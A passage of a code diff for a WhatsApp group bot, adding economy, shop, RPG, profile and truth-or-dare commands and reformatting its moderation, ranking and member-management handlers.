+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: ecoRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "baltop":
+            case "richest": {
+              const ecoRes = await economy.leaderboard();
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: ecoRes.message,
+                  mentions: ecoRes.mentions,
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            // ----- Shop / Inventory -----
+            case "shop": {
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: shop.listShop() },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "buy": {
+              if (!args[0]) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Usage: .buy <item_id> — see .shop",
+                  },
+                  { quoted: msg },
+                );
+              }
+              const shopRes = await shop.buyItem(finalLid, args[0]);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: shopRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "inventory":
+            case "inv": {
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: await shop.showInventory(finalLid),
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "sell": {
+              if (!args[0]) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Usage: .sell <item_id>",
+                  },
+                  { quoted: msg },
+                );
+              }
+              const shopRes = await shop.sellItem(finalLid, args[0]);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: shopRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "settitle": {
+              const shopRes = await shop.setTitle(finalLid, text);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: shopRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            // ----- RPG Leveling -----
+            case "class": {
+              const rpgRes = await rpg.chooseClass(finalLid, text);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: rpgRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "rpgprofile": {
+              let target = finalLid;
+              let name = msg.pushName;
+              if (p.mentionedJids?.length) {
+                target = p.mentionedJids[0];
+                name = null;
+              }
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: await rpg.profile(target, name),
+                  mentions: [target],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "profile": {
+              // if (isGroup) {
+              //     return mess.reply('🔐 For your privacy, send *.profile* to me in a private chat.');
+              // }
+              if (!userProfiles.isLid(finalLid)) {
+                return mess.reply(
+                  "I could not read your WhatsApp LID yet. Send any message and try *.profile* again.",
+                );
+              }
+              try {
+                await userProfiles.ensureAccount({
+                  lid: finalLid,
+                  whatsappJid: finalJid,
+                  displayName: msg.pushName,
+                });
+                const profile = await userProfiles.getProfileSummary(finalLid);
+                const msgtext = !isGroup
+                  ? userProfiles.formatProfileMessage(profile)
+                  : userProfiles.formatsecretProfileMessage(profile);
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: msgtext,
+                  },
+                  { quoted: msg },
+                );
+              } catch (profileError) {
+                console.error(
+                  "[profile] Failed to send profile:",
+                  profileError.message,
+                );
+                await mess.reply(
+                  "❌ Your profile is temporarily unavailable. Please try again later.",
+                );
+              }
+              break;
+            }
+
+            case "changpw": {
+              if (isGroup) return mess.private();
+              if (!userProfiles.isLid(finalLid)) {
+                return mess.reply(
+                  "I could not read your WhatsApp LID yet. Send any message and try again.",
+                );
+              }
+              if (!text)
+                return mess.reply(
+                  "Usage: *.changpw <new password>* (10–128 characters)",
+                );
+              try {
+                const result = await userProfiles.changePassword(
+                  finalLid,
+                  text,
+                );
+                await mess.reply(
+                  result.ok
+                    ? "✅ Password changed successfully. Keep it private."
+                    : `❌ ${result.message}`,
+                );
+              } catch (passwordError) {
+                console.error(
+                  "[profile] Failed to change password:",
+                  passwordError.message,
+                );
+                await mess.reply(
+                  "❌ Could not change your password right now. Please try again later.",
+                );
+              }
+              break;
+            }
+
+            case "train": {
+              const rpgRes = await rpg.train(finalLid);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: rpgRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "dungeon": {
+              const rpgRes = await rpg.dungeon(finalLid);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: rpgRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "rpgtop": {
+              const rpgRes = await rpg.leaderboard();
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: rpgRes.message,
+                  mentions: rpgRes.mentions,
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            // ----- Truth or Dare / Would You Rather -----
+            case "truth": {
+              if (!isGroup) return mess.group();
+              const target = p.mentionedJids?.[0] || null;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: tod.getTruth(target),
+                  mentions: target ? [target] : [],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "dare": {
+              if (!isGroup) return mess.group();
+              const target = p.mentionedJids?.[0] || null;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: tod.getDare(target),
+                  mentions: target ? [target] : [],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "tod": {
+              if (!isGroup) return mess.group();
+              const target = p.mentionedJids?.[0] || null;
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: tod.getTruthOrDare(target),
+                  mentions: target ? [target] : [],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "wyr": {
+              if (!isGroup) return mess.group();
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: tod.getWouldYouRather(),
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+            // ================= END NEW GAMES ADD-ON PACK =================
+
+            case "newhang":
+              break;
+            case "joinhang":
+              break;
+            case "starthang":
+              break;
+            case "endhang":
+              break;
+            case "hanglead":
+              break;
+
+            case "maintain": {
+              if (!isOwner) return mess.owner();
+              if (!text)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "send on or off",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+
+              const mode = args[0]?.toLowerCase();
+
+              if (!mode || (mode !== "on" && mode !== "off")) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⚙️ Usage:\n.maintain on – enable maintenance mode\n.maintain off – disable maintenance mode",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+
+              const isOn = mode === "on";
+              updateBotStatus(
+                isOn,
+                isOn ? "🚧 Bot under maintenance." : "✅ Bot is active.",
+              );
+
+              return AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: `🔧 Maintenance mode ${isOn ? "enabled" : "disabled"}.`,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "botst": {
+              const status = loadBotStatus();
+
+              const statusMsg =
+                `🤖 *Bot Status:*\n\n` +
+                `🟢 Mode: ${status.underMaintenance ? "🟥 Under Maintenance" : "🟩 Active"}\n` +
+                `💬 Message: ${status.message}`;
+
+              return AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: statusMsg,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "news": {
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                react: {
+                  text: "🔄",
+                  key: msg.key,
+                },
+              });
+              fetchnews()
+                .then((response) => {
+                  const message2send = `\n
 -------------------------------News #01----------------------------------
 
 *Title:* \`${response[0].title}\`
@@ -5047,2016 +5835,2228 @@ Url: ${response[1].url}
 
 
 *Note The Original News Resources is Flashnews*
-  `
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    image: {
-                                        url: './assets/img/news.jpeg'
-                                    },
-                                    caption: message2send
-                                }, {
-                                    quoted: msg
-                                });
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: {
-                                        text: '✅',
-                                        key: msg.key
-                                    }
-                                });
-                            }).catch(error => {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {text:error.message});
-                            })
-
-                            break;
-                        }
-
-
-                        //group main functionality
-
-
-                        //warn
-                        case "warn":
-                        case "warning": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin();
-                            let users = [];
-                            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
-                                users = msg.message.extendedTextMessage.contextInfo.mentionedJid;
-
-                            } else if (args.length > 0) {
-                                users = args
-                                    .map(arg => arg.replace(/^\+/, ''))
-                                    .filter(arg => /^\d{5,15}$/.test(arg))
-                                    .map(num => num + '@s.whatsapp.net');
-                                console.log(users.length)
-                                if (users.length === 0) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'enter valid number'
-                                }, {
-                                    quoted: msg
-                                }); // if no valid numbers, stop
-                            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
-                                users = [msg.message.extendedTextMessage.contextInfo.participant];
-                            } else {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Please mention someone, reply to a user, or provide a number to ${command}!`
-                                });
-                            }
-
-                            await warnUser(AlexaInc, msg.key.remoteJid, msg.key.participant, users, msg)
-
-
-                            break;
-                        }
-                        case "warns":
-                        case "warnings": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin();
-
-                            let users = [];
-                            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
-                                users = msg.message.extendedTextMessage.contextInfo.mentionedJid;
-
-                            } else if (args.length > 0) {
-                                users = args
-                                    .map(arg => arg.replace(/^\+/, ''))
-                                    .filter(arg => /^\d{5,15}$/.test(arg))
-                                    .map(num => num + '@s.whatsapp.net');
-                                console.log(users.length)
-                                if (users.length === 0) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'enter valid number'
-                                }, {
-                                    quoted: msg
-                                }); // if no valid numbers, stop
-                            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
-                                users = [msg.message.extendedTextMessage.contextInfo.participant];
-                            } else {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Please mention someone, reply to a user, or provide a number to ${command}!`
-                                });
-                            }
-                            // console.log(users)
-                            await checkWarns(AlexaInc, msg.key.remoteJid, users)
-
-
-                            break;
-                        }
-
-
-
-                        case "report": {
-
-                            const joinUrl = `https://wa.me/${botNumber}?text=_report_${msg.key.remoteJid}`;
-
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                title: "🕵️ report a user",
-                                text: `click here to report about a member `,
-                                footer: "click this button to dm",
-                                interactiveButtons: [{
-                                    name: "cta_url",
-                                    buttonParamsJson: JSON.stringify({ display_text: "Report", url: joinUrl })
-                                }]
-                            });
-                            break
-                        }
-
-
-
-                        case "remwarn":
-                        case "rmwarn": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin();
-                            let users = [];
-                            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
-                                users = msg.message.extendedTextMessage.contextInfo.mentionedJid;
-
-                            } else if (args.length > 0) {
-                                users = args
-                                    .map(arg => arg.replace(/^\+/, ''))
-                                    .filter(arg => /^\d{5,15}$/.test(arg))
-                                    .map(num => num + '@s.whatsapp.net');
-                                console.log(users.length)
-                                if (users.length === 0) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'enter valid number'
-                                }, {
-                                    quoted: msg
-                                }); // if no valid numbers, stop
-                            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
-                                users = [msg.message.extendedTextMessage.contextInfo.participant];
-                            } else {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Please mention someone, reply to a user, or provide a number to ${command}!`
-                                });
-                            }
-                            await removeWarn(AlexaInc, msg.key.remoteJid, users)
-                            break;
-                        }
-
-                        case "rmw_fbc": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin();
-                            const users = [text]
-                            await removeWarn(AlexaInc, msg.key.remoteJid, users)
-                            break
-                        }
-
-                        case "mute": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin()
-                            const muteArg = args[1];
-                            const muteDuration = muteArg !== undefined ? parseInt(muteArg, 10) : undefined;
-                            if (muteArg !== undefined && (isNaN(muteDuration) || muteDuration <= 0)) {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Please provide a valid number of minutes or use .mute with no number to mute immediately.',
-                                    ...channelInfo
-                                }, {
-                                    quoted: message
-                                });
-                            } else {
-                                await muteCommand(AlexaInc, msg.key.remoteJid, msg.key.participant, msg,
-                                    muteDuration);
-                            }
-
-
-                            break;
-                        }
-                        case "unmute": {
-
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-                            if (!isBotAdmins) return mess.botadmin();
-
-                            await unmuteCommand(AlexaInc, msg.key.remoteJid)
-
-                            break;
-                        }
-                        case 'topadder': {
-                            const fs = require('fs');
-
-                            // 1. Define the file path for this specific group
-                            // Assuming 'from' or 'm.chat' is your group ID variable. Adjust as needed.
-                            const chatId = msg.key.remoteJid;
-                            const filePath = `./database/add_counts/${chatId}.json`;
-
-                            // 2. Check if data exists for this group
-                            if (!fs.existsSync(filePath)) {
-                                return AlexaInc.sendMessage(chatId, {
-                                    text: '⚠️ No member add records found for this group yet.'
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-
-                            // 3. Read and Parse the JSON
-                            const fileContent = fs.readFileSync(filePath, 'utf-8');
-                            const jsonDb = JSON.parse(fileContent);
-
-                            // 4. Convert Object to Array and Sort by Count (Highest to Lowest)
-                            // Object.entries turns { "user1": 10, "user2": 5 } into [ ["user1", 10], ["user2", 5] ]
-                            const sortedAdders = Object.entries(jsonDb).sort((a, b) => b[1] - a[1]);
-
-                            // 5. Slice to get Top 10 (optional)
-                            const topList = sortedAdders.slice(0, 10);
-
-                            // 6. Construct Message and Mentions Array
-                            let mentionText = `🏆 *Top Member Adders*\n\n`;
-                            let mentions = [];
-
-                            topList.forEach((entry, index) => {
-                                const userId = entry[0]; // e.g., 194300461756480@lid
-                                const count = entry[1]; // e.g., 5
-
-                                // Add the raw ID to the mentions array so WhatsApp tags them
-                                mentions.push(userId);
-
-                                // Format the ID for display: Remove '@lid' or '@s.whatsapp.net'
-                                const cleanId = userId.split('@')[0];
-
-                                // Add line to message: 1. @194300... : 5
-                                mentionText += `${index + 1}. @${cleanId} : *${count}* Added\n`;
-                            });
-
-                            mentionText += `\n_Total recorded adders: ${sortedAdders.length}_`;
-
-                            // 7. Send the Message
-                            await AlexaInc.sendMessage(
-                                chatId, {
-                                text: mentionText,
-                                mentions: mentions // Crucial: contains the full IDs including @lid
-                            }, {
-                                quoted: msg
-                            }
-                            );
-                            break;
-                        }
-
-
-
-
-                        case 'ranking':
-                        case 'global':
-                        case 'daily':
-                        case 'weekly': {
-                            const moment = require('moment-timezone');
-                            const chatId = msg.key.remoteJid;
-                            const filePath =
-                                `${RANKING_FOLDER}/${chatId}.json`; // Ensure RANKING_FOLDER is defined globally or locally
-
-                            // ---------------------------------------------------------
-                            // 1. FETCH FROM CACHE (OR DISK IF NOT IN CACHE)
-                            // ---------------------------------------------------------
-                            if (!rankingCache[chatId]) {
-                                // Not in RAM? Try to load from disk
-                                if (fs.existsSync(filePath)) {
-                                    try {
-                                        rankingCache[chatId] = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
-                                    } catch (err) {
-                                        console.error(`Corrupt ranking file for ${chatId}`, err);
-                                        rankingCache[chatId] = {}; // Fallback
-                                    }
-                                } else {
-                                    // Not in RAM and Not on Disk
-                                    return AlexaInc.sendMessage(chatId, {
-                                        text: '📊 No messaging data recorded for this group yet.'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                }
-                            }
-
-                            // Now we are sure we have data in the variable
-                            const rankDb = rankingCache[chatId];
-                            // ---------------------------------------------------------
-
-                            let mode = 'global';
-                            const text = (args.join(" ") || "").toLowerCase();
-                            const cmd = command.toLowerCase();
-
-                            if (cmd.includes('daily') || text.includes('daily')) mode = 'daily';
-                            else if (cmd.includes('weekly') || text.includes('weekly')) mode = 'weekly';
-
-                            const currentDay = moment().tz('Asia/Colombo').format('YYYY-MM-DD');
-                            const currentWeek = moment().tz('Asia/Colombo').format('YYYY-WW');
-
-                            const sortedStats = Object.entries(rankDb).map(([id, data]) => {
-                                let count = 0;
-
-                                if (mode === 'global') {
-                                    count = data.global || 0;
-                                } else if (mode === 'daily') {
-                                    if (data.daily && data.daily.dayKey === currentDay) {
-                                        count = data.daily.count;
-                                    }
-                                } else if (mode === 'weekly') {
-                                    if (data.weekly && data.weekly.weekKey === currentWeek) {
-                                        count = data.weekly.count;
-                                    }
-                                }
-                                return {
-                                    id,
-                                    count
-                                };
-                            })
-                                .filter(u => u.count > 0)
-                                .sort((a, b) => b.count - a.count);
-
-                            if (sortedStats.length === 0) {
-                                return AlexaInc.sendMessage(chatId, {
-                                    text: `📉 No active messages found for *${mode}* ranking yet.`
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-
-                            const topList = sortedStats.slice(0, 15);
-
-                            let mentionText = `🏆 *${mode.toUpperCase()} CHAT RANKING*\n`;
-                            mentionText += `_Top active members in ${groupMetadata.subject}_\n\n`;
-
-                            let mentions = [];
-
-                            topList.forEach((user, index) => {
-                                const medal = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' :
-                                    `${index + 1}.`;
-                                mentions.push(user.id);
-                                const cleanId = user.id.split('@')[0];
-                                mentionText += `${medal} @${cleanId} : *${user.count}* \n`;
-                            });
-
-                            mentionText += `\n_Total active users: ${sortedStats.length}_`;
-
-                            // 4. Send Message
-                            await AlexaInc.sendMessage(
-                                chatId, {
-                                text: mentionText,
-                                mentions: mentions
-                            }, {
-                                quoted: msg
-                            }
-                            );
-                            break;
-                        }
-
-                        case 'rank':
-                        case 'myrank': {
-                            const moment = require('moment-timezone');
-                            const chatId = msg.key.remoteJid;
-                            const senderId = finalLid;
-                            const filePath = `${RANKING_FOLDER}/${chatId}.json`;
-
-                            // ---------------------------------------------------------
-                            // 1. FETCH FROM CACHE
-                            // ---------------------------------------------------------
-                            if (!rankingCache[chatId]) {
-                                if (fs.existsSync(filePath)) {
-                                    try {
-                                        rankingCache[chatId] = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
-                                    } catch {
-                                        rankingCache[chatId] = {};
-                                    }
-                                } else {
-                                    return AlexaInc.sendMessage(chatId, {
-                                        text: '📊 No data recorded for this group yet.'
-                                    }, {
-                                        quoted: m
-                                    });
-                                }
-                            }
-                            const rankDb = rankingCache[chatId];
-
-                            // 2. Check if user exists
-                            const userStats = rankDb[senderId];
-                            if (!userStats) {
-                                return AlexaInc.sendMessage(chatId, {
-                                    text: '📉 You haven\'t sent any messages yet. Start chatting to get ranked!'
-                                }, {
-                                    quoted: m
-                                });
-                            }
-
-                            // 3. Prepare Data & Sort by GLOBAL Count
-                            const sortedUsers = Object.entries(rankDb)
-                                .map(([id, data]) => ({
-                                    id,
-                                    global: data.global || 0
-                                }))
-                                .sort((a, b) => b.global - a.global);
-
-                            const myIndex = sortedUsers.findIndex(user => user.id === senderId);
-                            const myRank = myIndex + 1;
-                            const myCount = sortedUsers[myIndex].global;
-
-                            // 4. Calculate Stats (Daily/Weekly)
-                            const currentDay = moment().tz('Asia/Colombo').format('YYYY-MM-DD');
-                            const currentWeek = moment().tz('Asia/Colombo').format('YYYY-WW');
-
-                            const dailyCount = (userStats.daily && userStats.daily.dayKey === currentDay) ?
-                                userStats.daily.count : 0;
-                            const weeklyCount = (userStats.weekly && userStats.weekly.weekKey === currentWeek) ?
-                                userStats.weekly.count : 0;
-
-                            // ---------------------------------------------------------
-                            // 5. CALCULATE UP/DOWN GAPS
-                            // ---------------------------------------------------------
-                            let gapText = "";
-
-                            // A. Check user ABOVE (Rank Up)
-                            if (myIndex > 0) { // If not Rank 1
-                                const userAbove = sortedUsers[myIndex - 1];
-                                const diff = (userAbove.global - myCount) + 1; // +1 to overtake
-                                gapText += `🔼 *Rank Up:* Need *${diff}* msgs to beat Top ${myRank - 1}\n`;
-                            } else {
-                                gapText += `👑 *You are the Leader!* Keep it up!\n`;
-                            }
-
-                            // B. Check user BELOW (Safety Margin)
-                            if (myIndex < sortedUsers.length - 1) { // If not last
-                                const userBelow = sortedUsers[myIndex + 1];
-                                const lead = (myCount - userBelow.global);
-                                // If lead is 0, they are tied but you are ranked higher due to sort order
-                                const leadMsg = lead === 0 ? "⚠️ Tied!" : `*${lead}* msgs ahead`;
-                                gapText += `🔽 *Safety:* ${leadMsg} of Top ${myRank + 1}`;
-                            } else {
-                                gapText += `🔽 *Bottom:* You are at the last rank.`;
-                            }
-
-                            // 6. Build Message
-                            let text = `👤 *YOUR RANK PROFILE*\n`;
-                            text += `_Stats for @${senderId.split('@')[0]}_\n\n`;
-
-                            let medal = '';
-                            if (myRank === 1) medal = '🥇 ';
-                            else if (myRank === 2) medal = '🥈 ';
-                            else if (myRank === 3) medal = '🥉 ';
-
-                            text += `${medal}🏆 *Rank:* #${myRank} (of ${sortedUsers.length})\n`;
-                            text += `🌐 *Global:* ${myCount} msgs\n`;
-                            text += `📅 *Daily:* ${dailyCount} msgs\n`;
-                            text += `🗓️ *Weekly:* ${weeklyCount} msgs\n\n`;
-
-                            text += `📊 *Position Analysis:*\n${gapText}`;
-
-                            await AlexaInc.sendMessage(
-                                chatId, {
-                                text: text,
-                                mentions: [senderId]
-                            }, {
-                                quoted: msg
-                            }
-                            );
-                            break;
-                        }
-
-                        case 'add':
-                        case 'remove':
-                        case 'promote':
-                        case 'demote': {
-                            if (!isGroup) return mess.group();
-                            if (command == 'add' && !isOwner) return mess.owner()
-                            if (!isAdmins && !isOwner) return mess['admin&owner']();
-
-                            if (!isBotAdmins)
-                                return mess.botadmin();
-
-                            // console.log({ isGroup, isAdmins, isBotAdmins });
-
-                            // Get mentioned users if any
-                            let users = [];
-
-                            // 1. Check for mentions
-                            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
-                                users = msg.message.extendedTextMessage.contextInfo.mentionedJid;
-
-                                // 2. Fallback: check for numbers in args
-                            } else if (args.length > 0) {
-                                users = args
-                                    .map(arg => arg.replace(/^\+/, '')) // remove leading +
-                                    .filter(arg => /^\d{5,15}$/.test(arg)) // keep only valid numbers (5–15 digits)
-                                    .map(num => num + '@s.whatsapp.net');
-                                console.log(users.length)
-                                if (users.length === 0) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'enter valid number'
-                                }, {
-                                    quoted: msg
-                                }); // if no valid numbers, stop
-                            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
-                                // Put the single participant JID into an array for consistency
-                                users = [msg.message.extendedTextMessage.contextInfo.participant];
-
-                                // 4. If nothing is found, send error
-                            } else {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Please mention someone, reply to a user, or provide a number to ${command}!`
-                                });
-                            }
-
-                            // This will now log the replied-to user's JID in an array
-                            console.log(users);
-
-                            AlexaInc.groupParticipantsUpdate(
-                                msg.key.remoteJid,
-                                users,
-                                command // 'add', 'remove', 'promote', 'demote'
-                            ).then((res) => {
-                                if (res[0].status !== '200') return AlexaInc.sendMessage(msg.key
-                                    .remoteJid, {
-                                    text: `Failed to ${command} user(s). Maybe the number is incorrect or they left the group.`
-                                });
-                                // console.log(res)
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `User(s) ${command}d successfully!`
-                                });
-                            }).catch(error => {
-                                console.error(`Failed to ${command} user(s):`, error);
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Failed to ${command} user(s). Maybe the number is incorrect or they left the group.`
-                                });
-                            });
-
-                            break;
-                        }
-
-                        //invite
-                        case 'invite': {
-
-                            if (!isGroup) return mess.group()
-                            if (!isOwner) return mess.owner()
-                            const code = await AlexaInc.groupInviteCode(msg.key.remoteJid)
-                            console.log(code)
-                            let user
-                            if (args.length > 0) {
-                                user = args
-                                    .map(arg => arg.replace(/^\+/, '')) // remove leading +
-                                    .filter(arg => /^\d{5,15}$/.test(arg)) // keep only valid numbers (5–15 digits)
-                                    .map(num => num + '@s.whatsapp.net');
-                                // console.log(users.length)
-                                if (user.length === 0) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'enter valid number'
-                                }, {
-                                    quoted: msg
-                                }); // if no valid numbers, stop
-                            }
-                            console.log(user)
-                            await AlexaInc.sendMessage(
-                                user[0], {
-                                groupInvite: {
-                                    jid: msg.key.remoteJid,
-                                    name: groupMetadata.subject,
-                                    caption: 'Join My Whatsapp Group',
-                                    code: code,
-                                }
-                            }
-                            )
-                            break;
-                        }
-
-                        case 'kikbots': {
-                            const action = args[0] ? args[0].toLowerCase() : '';
-                            if (action !== 'on' && action !== 'off') {
-                                const usageText = 'Usage: .kikbots [on | off]\n\n' +
-                                    '- off: Allow other bots to remain in the group.\n' +
-                                    '- on: Automatically remove other bots.';
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: usageText
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-                            const shouldAllow = (action === 'off');
-                            const query = `
+  `;
+                  AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      image: {
+                        url: "./assets/img/news.jpeg",
+                      },
+                      caption: message2send,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    react: {
+                      text: "✅",
+                      key: msg.key,
+                    },
+                  });
+                })
+                .catch((error) => {
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: error.message,
+                  });
+                });
+
+              break;
+            }
+
+            //group main functionality
+
+            //warn
+            case "warn":
+            case "warning": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+              let users = [];
+              if (
+                msg.message.extendedTextMessage?.contextInfo?.mentionedJid
+                  ?.length > 0
+              ) {
+                users =
+                  msg.message.extendedTextMessage.contextInfo.mentionedJid;
+              } else if (args.length > 0) {
+                users = args
+                  .map((arg) => arg.replace(/^\+/, ""))
+                  .filter((arg) => /^\d{5,15}$/.test(arg))
+                  .map((num) => num + "@s.whatsapp.net");
+                console.log(users.length);
+                if (users.length === 0)
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "enter valid number",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  ); // if no valid numbers, stop
+              } else if (
+                msg.message.extendedTextMessage?.contextInfo?.participant
+              ) {
+                users = [
+                  msg.message.extendedTextMessage.contextInfo.participant,
+                ];
+              } else {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Please mention someone, reply to a user, or provide a number to ${command}!`,
+                });
+              }
+
+              await warnUser(
+                AlexaInc,
+                msg.key.remoteJid,
+                msg.key.participant,
+                users,
+                msg,
+              );
+
+              break;
+            }
+            case "warns":
+            case "warnings": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+
+              let users = [];
+              if (
+                msg.message.extendedTextMessage?.contextInfo?.mentionedJid
+                  ?.length > 0
+              ) {
+                users =
+                  msg.message.extendedTextMessage.contextInfo.mentionedJid;
+              } else if (args.length > 0) {
+                users = args
+                  .map((arg) => arg.replace(/^\+/, ""))
+                  .filter((arg) => /^\d{5,15}$/.test(arg))
+                  .map((num) => num + "@s.whatsapp.net");
+                console.log(users.length);
+                if (users.length === 0)
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "enter valid number",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  ); // if no valid numbers, stop
+              } else if (
+                msg.message.extendedTextMessage?.contextInfo?.participant
+              ) {
+                users = [
+                  msg.message.extendedTextMessage.contextInfo.participant,
+                ];
+              } else {
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Please mention someone, reply to a user, or provide a number to ${command}!`,
+                });
+              }
+              // console.log(users)
+              await checkWarns(AlexaInc, msg.key.remoteJid, users);
+
+              break;
+            }
+
+            case "report": {
+              const joinUrl = `https://wa.me/${botNumber}?text=_report_${msg.key.remoteJid}`;
+
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                title: "🕵️ report a user",
+                text: `click here to report about a member `,
+                footer: "click this button to dm",
+                interactiveButtons: [
+                  {
+                    name: "cta_url",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "Report",
+                      url: joinUrl,
+                    }),
+                  },
+                ],
+              });
+              break;
+            }
+
+            case "remwarn":
+            case "rmwarn": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess["admin&owner"]();
+              if (!isBotAdmins) return mess.botadmin();
+              let users = [];
+              if (
+                msg.message.extendedTextMessage?.contextInfo?.mentionedJid
+                  ?.length > 0
+              ) {
+                users =
+                  msg.message.extendedTextMessage.contextInfo.mentionedJid;
+              } else if (args.length > 0) {
+                users = args
+                  .map((arg) => arg.replace(/^\+/, ""))
